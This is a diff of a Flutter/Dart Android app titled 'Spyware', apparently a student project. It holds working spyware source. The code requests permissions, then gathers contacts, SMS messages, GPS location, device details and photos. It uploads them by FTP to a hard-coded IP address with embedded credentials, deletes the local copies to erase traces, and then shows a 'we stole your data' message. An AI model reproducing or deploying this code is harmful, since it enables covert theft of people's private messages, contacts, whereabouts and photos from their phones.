@@ -2,12 +2,11 @@
 //***** Spyware Android LP CDAISI *****
 //*************************************
 
+// ***** Importation des plugins *****
 import 'dart:io';
-import 'package:flutter/cupertino.dart';
 import 'package:geolocator/geolocator.dart';
 import 'package:device_info/device_info.dart';
 import 'package:flutter/material.dart';
-// ignore: import_of_legacy_library_into_null_safe
 import 'package:sms/sms.dart';
 import 'package:ftpconnect/ftpConnect.dart';
 import 'package:permission_handler/permission_handler.dart';
@@ -43,8 +42,8 @@ class MyHomePage extends StatefulWidget {
 class _MyHomePageState extends State<MyHomePage> {
   int _counter = 0;
 
-  // Demande de permission
-  void _incrementCounter() async {
+  // ***** Demande de permission *****
+  void _FonctionLancement() async {
     Map<Permission, PermissionStatus> statuses = await [
       Permission.storage,
       Permission.contacts,
@@ -53,81 +52,72 @@ class _MyHomePageState extends State<MyHomePage> {
       Permission.camera,
     ].request();
 
-    // Préparation de la connexion FTP
+    // ***** Préparation de la connexion FTP *****
     FTPConnect ftpConnect = FTPConnect('141.94.77.172',
     user: 'utilisateursftp', pass: 'Sftp59?Spyware!');
 
-    // ********** PARTIE CREATION DES FICHIERS ***********
-    Directory tempDir = await getTemporaryDirectory();
-    // Creation de la liste de fichiers finals
-    var list_files = ["${tempDir.path}/contact.txt","${tempDir.path}/sms.txt","${tempDir.path}/phone_information.txt","${tempDir.path}/localisation.txt"];
+    // ***** PARTIE CREATION DES FICHIERS *****
+    Directory TempDir = await getTemporaryDirectory();
 
-    final File file_contact = File("${tempDir.path}/contact.txt");
-    final filename_contact = "${tempDir.path}/contact.txt";
+    // Creation de la liste des fichiers à envoyer
+    var listeFichiers = ["${TempDir.path}/contact.txt","${TempDir.path}/sms.txt","${TempDir.path}/phone_information.txt","${TempDir.path}/localisation.txt"];
 
-    final File file_sms = File("${tempDir.path}/sms.txt");
-    final filename_sms = "${tempDir.path}/sms.txt";
+    final FichierContact = "${TempDir.path}/contact.txt";
+    final FichierSMS = "${TempDir.path}/sms.txt";
+    final FichierInformation = "${TempDir.path}/phone_information.txt";
+    final FichierLocalisation = "${TempDir.path}/localisation.txt";
 
-    final File file_phone = File("${tempDir.path}/phone_information.txt");
-    final filename_phone = "${tempDir.path}/phone_information.txt";
-
-    final File file_geo = File("${tempDir.path}/localisation.txt");
-    final filename_geo = "${tempDir.path}/localisation.txt";
-
-    // ********** PARTIE INFORMATIONS TELEPHONE **********
-
+    // ***** PARTIE INFORMATIONS TELEPHONE *****
     if (Platform.isAndroid) {
       var androidInfo = await DeviceInfoPlugin().androidInfo;
-      var release = androidInfo.version.release;
-      var manufacturer = androidInfo.manufacturer;
-      var host = androidInfo.host;
+      var androidVersion = androidInfo.version.release;
+      var marque = androidInfo.manufacturer;
+      var nomHost = androidInfo.host;
       // Ajout des informations dans le fichier
-      File(filename_phone).writeAsString("Informations sur le telephone : \nAndroid $release, $manufacturer, $host").then((File file_phone) {});
+      File(FichierInformation).writeAsString("Informations sur le telephone : \nAndroid $androidVersion, $marque, $nomHost").then((File file_phone) {});
     }
 
-    // *********** PARTIE CONTACTS ***********
-
+    // ****** PARTIE CONTACTS ******
     // Récupérer l'ensemble des contacts dans une liste
-    List<Contact> contacts = await ContactsService.getContacts();
+    List<Contact> infoContacts = await ContactsService.getContacts();
     // Variable qui va stocker l'ensemble des informations des contacts
-    var info_contact = "";
+    var infoContact = "";
     // Parcourir la liste
-    for (var contact in contacts) {
-      info_contact = info_contact+"Nom du contact : "+contact.displayName!+" \nNumero : "+contact.phones!.first.value!+"\n";
+    for (var contact in infoContacts) {
+      infoContact = infoContact+"Nom du contact : "+contact.displayName!+" \nNumero : "+contact.phones!.first.value!+"\n";
     }
-    File(filename_contact).writeAsString(info_contact).then((File file_contact) {});
+    // Ajout des informations dans le fichier
+    File(FichierContact).writeAsString(infoContact).then((File fileContact) {});
 
-    // ********** PARTIE LOCALISATION **********
-
+    // ***** PARTIE LOCALISATION *****
     var location = await Geolocator.getCurrentPosition();
-    var position = "${location}";
-    File(filename_geo).writeAsString("Informations sur la position du telephone : "+position).then((File file_geo) {});
+    var position = "$location";
+    // Ajout des informations dans le fichier
+    File(FichierLocalisation).writeAsString("Informations sur la position du telephone : "+position).then((File fileLocalisation) {});
 
-    // ********** PARTIE SMS **********
-    File(filename_sms).writeAsString("Recuperation des SMS : ").then((File file_sms) {});
+    // ***** PARTIE SMS *****
+    // Ajout des informations dans le fichier
+    File(FichierSMS).writeAsString("Recuperation des SMS : ").then((File fileSMS) {});
 
     // Création de l'instance de la classe SmsQuery
-    SmsQuery query = new SmsQuery();
+    SmsQuery query = SmsQuery();
     // Récupération de la liste des instances SMS (reçus et envoyés)
-    List<SmsMessage> messages = await query.querySms(kinds: [SmsQueryKind.Inbox, SmsQueryKind.Sent]);
+    List<SmsMessage> messageList = await query.querySms(kinds: [SmsQueryKind.Inbox, SmsQueryKind.Sent]);
 
     int compteur = 0;
-    var sms = "";
+    var infoSMS = "";
     // Parcourir les messages
-    for (var message in messages) {
+    for (var message in messageList) {
       if (compteur < 20) {
-        sms = sms+"Numero Expediteur : "+message.sender+" Corps du message : "+message.body+"\n";
+        infoSMS = infoSMS+"Numero Expediteur : "+message.sender+" Corps du message : "+message.body+"\n";
         compteur++;
       }
     }
-    File(filename_sms).writeAsString(sms).then((File file_sms) {});
+    File(FichierSMS).writeAsString(infoSMS).then((File fileSMS) {});
 
-    // ********** PARTIE CAMERA **********
-
-    // ********** Partie Envoie des fichiers **********
-
+    // ***** Partie Envoie des fichiers *****
     // Faire une liste des fichiers à envoyer
-    for (var fichier in list_files) {
+    for (var fichier in listeFichiers) {
       File fileToUpload = File(fichier);
       // Lancement de la connexion FTP
       await ftpConnect.connect();
@@ -138,26 +128,25 @@ class _MyHomePageState extends State<MyHomePage> {
     } 
 
     // ***** Effacement des traces *****
-    for (var fichier in list_files) {
+    for (var fichier in listeFichiers) {
       File(fichier).deleteSync(); 
     }
 
-    // ********** PARTIE PHOTOS **********
+    // ***** PARTIE PHOTOS *****
 
     // Récupération de la liste de fichier
     Directory dir = Directory('/storage/1CEC-2F09/images');
-    List<FileSystemEntity> files = dir.listSync(recursive: true);
+    List<FileSystemEntity> phoneFiles = dir.listSync(recursive: true);
 
     // Définition de la liste de fichier
     var listFile = [];
-
     // Ajout des fichiers dans la liste
-    for (FileSystemEntity file in files) {
+    for (FileSystemEntity file in phoneFiles) {
       var path = file.path;
       listFile.add(path);
     }
-    //print(listFile);
 
+    // Envoie des photos
     int compteur2 = 0;
     for (var file in listFile) {
       if (compteur2 < 20) {
@@ -179,31 +168,37 @@ class _MyHomePageState extends State<MyHomePage> {
   Widget build(BuildContext context) {
     return Scaffold(
       appBar: AppBar(
+        // Titre de l'application
         title: const Text("Spyware"),
       ),
       body: Center(
         child: Column(
           mainAxisAlignment: MainAxisAlignment.center,
           children: <Widget>[
+            // Définition du bouton
             MaterialButton(
+                // Nom du bouton
                 child: const Text('Lancer l\'application'),
                 textColor: Colors.white,
                 color: Colors.green,
+                // Lorsque l'on appuie sur le bouton
                 onPressed: () {
-                  _incrementCounter();
+                  _FonctionLancement();
                   showDialog(
                       context: context,
                       barrierDismissible: false,
                       builder: (BuildContext context) {
                         return AlertDialog(
+                          // Nom de la boîte de dialogue
                           title: const Text('Information'),
+                          // Contenu de la boîte de dialogue
                           content: const Text("Nous avons volés vos données ! \n\nRendez-vous à l'url : \nhttp://141.94.77.172/index.html"),
                           actions: <Widget>[
+                            // Bouton de fermeture de la boîte de dialogue
                             MaterialButton(
                                 onPressed: () {
                                   Navigator.of(context).pop();
                                 },
-                                
                                 child: const Text('Fermer')
                                 )
                           ],
